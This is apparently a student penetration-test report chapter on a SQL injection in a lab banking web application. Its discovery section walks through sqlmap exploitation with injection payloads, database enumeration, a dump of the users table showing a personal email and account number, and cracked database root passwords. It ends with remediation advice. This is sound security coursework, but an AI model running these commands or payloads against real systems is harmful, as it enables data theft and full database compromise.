

\chapter{MYSQL Injection}

\section{Observation}

We discovered that the request \textit{host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=x} is vulnerable to MYSQL Injections.
The attacker has to be logged in as user in order to create a new transaction . After inserting an account number and an amount for the new transaction the above-named request is sent. The user now would have to insert the TAN. At this point the parameter "transaction\_id can be used for all kind mysql  injections.


Likelihood: high\newline

Impact:      	high\newline

Risk: high \newline

\section{Discovery}
This vulnerability was discovered by the tool sqlmap. The result of the first Test in Listing \ref{listing:first_test} shows that GET-Parameter is vulnerable.



\begin{lstlisting}[caption= First Test with result,label=listing:first_test]
sqlmap -u "host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=14"

.....

GET parameter 'transaction_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection points with a total of 202 HTTP(s) requests:
---
Place: GET
Parameter: transaction_id
Type: boolean-based blind
Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
Payload: transaction_id=14' RLIKE (SELECT (CASE WHEN (6290=6290) THEN 14 ELSE 0x28 END)) AND 'umTL'='umTL

Type: AND/OR time-based blind
Title: MySQL < 5.0.12 AND time-based blind (heavy query)
Payload: transaction_id=14' AND 5296=BENCHMARK(5000000,MD5(0x46744978)) AND 'knKI'='knKI
---
\end{lstlisting}

The next step was to get the name of the database and the tables, as done in Listing \ref{sqlmap-get-tables}

\begin{lstlisting}[caption = Get name and tables of database,label=sqlmap-get-tables]
python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dbs
...
available databases [10]:
[*] banking_development
[*] dvwa
[*] information_schema
[*] mysql
[*] owasp10
[*] performance_schema
[*] phpmyadmin
[*] samurai_dojo_basic
[*] samurai_dojo_scavenger
[*] test


python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --tables -D banking_development

Database: banking_development
[5 tables]
+--------------+
| payments     |
| phinxlog     |
| tan_numbers  |
| transactions |
| users        |
+--------------+
\end{lstlisting}

Now you can dump a table, e.g "users"

\begin{lstlisting}[caption= Dump Table "users", label=listing:dump_table]
	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dump -D banking_development -T users
	...
	[15:14:07] [INFO] retrieved: id
	[15:14:07] [INFO] retrieved: name
	[15:14:08] [INFO] retrieved: password
	[15:14:09] [INFO] retrieved: email
	[15:14:10] [INFO] retrieved: admin
	[15:14:11] [INFO] retrieved: account_no
	...
	[15:14:14] [INFO] retrieved: 1
	[15:14:14] [INFO] retrieved: t.srivishnu@gmail.com
	[15:14:17] [INFO] retrieved: 1
	[15:14:17] [INFO] retrieved: t.srivishnu@gmail.com
	[15:14:19] [INFO] retrieved: 1234567890
	[15:14:20] [INFO] retrieved: 527652613432
	
\end{lstlisting}

As you can see in Listing \ref{listing:dump_table} sqlmap-get-tables  you receive a list of the columns of the table. You also get a list of all entries. For this example only the data of the admin were chosen, but you can access every entry.
 \newline
 \newline
A further possibillity is to break the authentication of the database by hijacking the password of the database root user.

\begin{lstlisting}[caption=Get password of database root user,label=listing:database_get_password]
	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --users --passwords -D banking_development 
	...
	database management system users [8]:
	[*] ''@'localhost'
	[*] ''@'samurai-wtf'
	[*] 'debian-sys-maint'@'localhost'
	[*] 'phpmyadmin'@'localhost'
	[*] 'root'@'127.0.0.1'
	[*] 'root'@'::1'
	[*] 'root'@'localhost'
	[*] 'root'@'samurai-wtf'
	...
	database management system users password hashes:                                               
	[*]  [1]:
	password hash: NULL
	[*] debian-sys-maint [1]:
	password hash: *3380A3DC27DEAC2CFFE40754FE91863CE3B5E786
	[*] phpmyadmin [1]:
	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
	clear-text password: samurai
	[*] root [2]:
	password hash: *7D9A6BEA19329B17998DC4F1130F8E40884A227F
	clear-text password: badass
	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
	clear-text password: samurai
	
\end{lstlisting}

With a integrated dictionary-based password cracking tool, you can convert the hashed password to plain text assuming weak passwords (like in our case). Now you can access adminer web-interface and login as root.


\section{Likelihood}
Assuming that the attacker has basic knowledge about MySql-Injection and knows how to use sqlmap, it's very likely that this vulnerability will be exploited.


\section{Implication}
The vulnerability in combination with sqlmap leads to full compromise of all data, stored in the database. The attacker can hijack information about the names of databases, tables, columns of tables and can even dump whole tables.  In our special case, it was even possible to get the users' passwords in plaintext, because they weren't hashed.
You can also get the name and the password of the root user of the database. This was benifited by a weak password, whereby the plain password could be recovered from the received hash within seconds. This results in full write access to the database for the attacker.


\section{Recommendations}
It's highly recommended, that all inputs for SQL queries are sanitized by escaping the ' character.
Another option is to create query objects via msqli instead of using simple query strings.
This objects will automatically sanitized all inputs. For more information, please go to \url{https://www.owasp.org/index.php/SQL\_Injection}

This observation is related to OWASP Top 10-A1-Injections

\section{Comparison with our App}
We avoided SQL-Injection by using Prepared Statements. Therefore the user inputs are sanitized and injections like shown above are not possible.
